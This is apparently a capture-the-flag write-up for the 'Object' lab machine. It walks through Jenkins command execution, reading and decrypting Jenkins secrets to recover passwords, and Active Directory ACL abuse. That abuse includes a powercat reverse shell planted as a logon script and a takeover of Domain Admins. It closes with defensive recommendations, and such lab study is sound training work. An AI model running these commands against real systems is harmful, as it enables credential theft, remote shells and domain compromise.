### Phase 1: Reconnaissance (Information Gathering)

The first step in any engagement is a thorough reconnaissance of the target system to understand its attack surface.

A full TCP port scan was initiated to identify all open services on the target IP address, providing a comprehensive map of potential entry points.

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.176.11 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.176.11
```

![nmap_result](images/Object1.png)


We can see 3 port being open let's check them. When we browse for port 80 we can see a IIS website:

![web_result](images/Object2.png)

The object.htb is revealed let's add to our hosts file:

```bash
echo "10.129.176.11 object.htb" | sudo tee -a /etc/hosts
```

The link rediricted us to 8080 port:

![web_result](images/Object3.png)

We allowed to create an account what we will do now, after that got rediricted to home page:

![web_result](images/Object4.png)

### Phase 2: Initial Access

After we create any new item, it seems like we can't trigger it using UI so we will go to Configure => Build Triggers => Trigger builds remotely, and type anything in auth token, then go to Build => Add Build Step => Execute a windows batch command and type any command but we will enter whoami and save it. On the top right corner move to your profile settings by clicking on you profile then configure. We will add a new api token that we typed in our build. Now trigger it:

```bash
curl http://123:11ae711e50f904e411623291ce59499f91@10.129.176.11:8080/job/123/build?token=123
```

Now head back to build history => concole icon:

![web_result](images/Object5.png)

We succed and whoami was executed by user oliver. Since we can't upload reverse shell let's check users:

```
cmd.exe /c "dir c:\Users\oliver\Appdata\local\jenkins\.jenkins\users"
```
```bash
curl http://123:11ae711e50f904e411623291ce59499f91@10.129.176.11:8080/job/123/build?token=123
```

![web_result](images/Object6.png)

```
admin_17207690984073220035
```

Now we can check admin's xml file:

```
cmd.exe /c "type c:\Users\oliver\Appdata\local\jenkins\.jenkins\users\admin_17207690984073220035\config.xml"
```

![web_result](images/Object7.png)

Offline hash cracking wasn't successful so we will decrypt Jenkins secret. For that we will need to print key and get base64 encoded secret as follows:

```
cmd.exe /c "type c:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets\master.key" 

powershell.exe -c "$secret=[convert]::ToBase64String((Get-Content -path 'c:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets\hudson.util.Secret' -Encoding byte));Write-Output $secret"
```

![web_result](images/Object8.png)
![web_result](images/Object9.png)

```
f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19

gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=
```

You can take script here: https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py

```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret credentials.xml
```

![script_result](images/Object10.png)

```
oliver:c1cdfun_d2434
```

Now that we have creds for the user oliver we can grab a flag:

```bash
evil-winrm -i 10.129.176.11 -u oliver -p c1cdfun_d2434
```

![evil_result](images/Object11.png)

Now that we're in, we will use bloodhound to enumerate the domain and find some vectors for lateral movement or privelege escalation:

```bash
bloodhound-python -d object.htb -ns 10.129.176.11 -u oliver -p c1cdfun_d2434 -c ALL --zip
```

Since port 53 hasn't showed up in nmap scan we have to upload sharphound then download results and watch them in bloodhound:

```bash
upload SharpHound.exe
download 20250725023300_BloodHound.zip
```

```bash
sudo neo4j start
```

### Phase 3: Lateral Movement

Oliver user has the ForceChangePassword for the smith user. We will change his password and then since he has GenericWrite on maria user and we can do almost anything with her.

For that we will need to uplaod PowerView and set new password for the smith:

```PS
$pass = ConvertTo-SecureString 'Igothacked123!' -AsPlainText -Force 
Set-DomainUserPassword -Identity smith -AccountPassword $pass
```

Now login as smith:

```bash
evil-winrm -i 10.129.176.11 -u smith -p 'Igothacked123!'
```

I found this technique to abuse GenericWrite: https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html#genericwrite-on-user

We will use powercat and nc. Powercat will be the scipt that will be executed when maria user will be logon and in the end of this script we will set a call to our netcat so we get reverse shell with maria user:

```
git clone https://github.com/samratashok/ADModule
echo 'powercat -c 127.0.0.1 -p 3233 -e cmd' >> powercat.ps1
```

```
Set-DomainObject -Identity maria -SET @{scriptPath="C:\\Windows\\System32\\spool\\drivers\\color\\powercat.ps1"}
```

```
.\nc.exe -lnvp 3233
```

### Phase 4: Privilege Escalation

We got a shell as maria and in Desktop folder we can find Engines.xls file with some password inside. Now create password list and use cme:

![evil_result](images/Object12.png)

```
d34gb8@
0de_434_d545
W3llcr4ft3d_4cls
```

```bash
cme winrm 10.129.176.11 -u maria -p W3llcr4ft3d_4cls
```

![cme_result](images/Object13.png)

```
maria:W3llcr4ft3d_4cls
```

```bash
evil-winrm -i 10.129.176.11 -u maria -p W3llcr4ft3d_4cls
```

Now that we have full access to maria user we can add ourselfs to Domain Admins group due to her WriteOwner on Domain Admins:

```PS
Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights All
net group "Domain Admins" maria /add /domain
```

![evil_result](images/Object14.png)

### Phase 5: Exfiltration

Now we need to reenter this session so we can read root flag:

![evil_result](images/Object15.png)


### What I Learnt
1. Jenkins Secrets Extraction
Technique: Offline decryption of master.key + hudson.util.Secret to recover credentials.
Lesson: Jenkins secrets aren't truly "secret" if file system access exists.

2. ACL-Based Privilege Chaining
Technique:
ForceChangePassword → Compromise secondary user (smith).
GenericWrite → Modify scriptPath for logon backdoor.
Lesson: Nested ACL permissions create invisible privilege escalation paths.

3. Logon Script Backdoors
Technique:
Abused scriptPath attribute to execute powercat.ps1 on user logon.
Lesson: User object properties are powerful persistence mechanisms.

4. Ownership Hijacking
Technique:
WriteOwner → Domain Admins → Add self to group.
Lesson: Ownership rights enable instant domain dominance.

### Reflection
- **ACLs > Exploits: Domain compromise relied entirely on ACL abuses, not CVEs.**
- **Credential Sprawl: Passwords found in spreadsheets (Engines.xls) enabled lateral movement.**
- **Persistence Blindspot: Logon script modifications went undetected despite granting SYSTEM-level access.**



### Redemption (Blue Team Recommendations)  

| Attack Phase                       | Defensive Countermeasures                                                                                                                                                             |  
|------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|  
| **Jenkins Secrets Extraction**     | - Restrict filesystem access to `secrets/` directory to Jenkins service account only. <br> - Automatically rotate secrets quarterly and after employee offboarding.                    |  
| **ACL-Based Privilege Chaining**   | - Run weekly BloodHound audits to detect `ForceChangePassword`/`GenericWrite` permissions. <br> - Implement approval workflows for ACL modifications via PAM solutions.              |  
| **Logon Script Backdoors**         | - Block PowerShell execution from non-standard paths via AppLocker. <br> - Alert on `scriptPath` modifications (Windows Event ID 4738).                                             |  
| **Ownership Hijacking**            | - Deny `WriteOwner` rights for privileged groups to non-tier0 accounts. <br> - Trigger SIEM alerts for `Set-DomainObjectOwner` operations (PowerShell Module Log Event ID 4104).     |  
| **Credential Storage in Files**    | - Deploy DLP scanners for password patterns in spreadsheets/documents. <br> - Replace static credentials with Azure Key Vault/Thycotic integrations.                               |  
| **Lateral Movement via WinRM**     | - Enforce LAPS for unique local admin passwords. <br> - Restrict WinRM access to jump hosts only via firewall rules.                                                                 |  
| **Build System Command Injection** | - Sandbox Jenkins build nodes in isolated VLANs. <br> - Require code signing for all batch/PowerShell scripts executed in CI/CD pipelines.                                         |  


### Key Takeaways for Blue Teams

1. Least Privilege ACLs:
- GenericWrite enabled domain takeover. Restrict modification rights to dedicated admin accounts only.

2. Secrets Management:
- Jenkins secrets were recoverable via file access. Use external secret managers (Hashicorp Vault).

3. Credential Hygiene:
- Passwords in Engines.xls compromised the domain. Enforce strict data handling policies.

4. Persistence Detection:
- Logon script backdoors persisted for hours. Monitor scriptPath/LogonScript attributes in real-time.
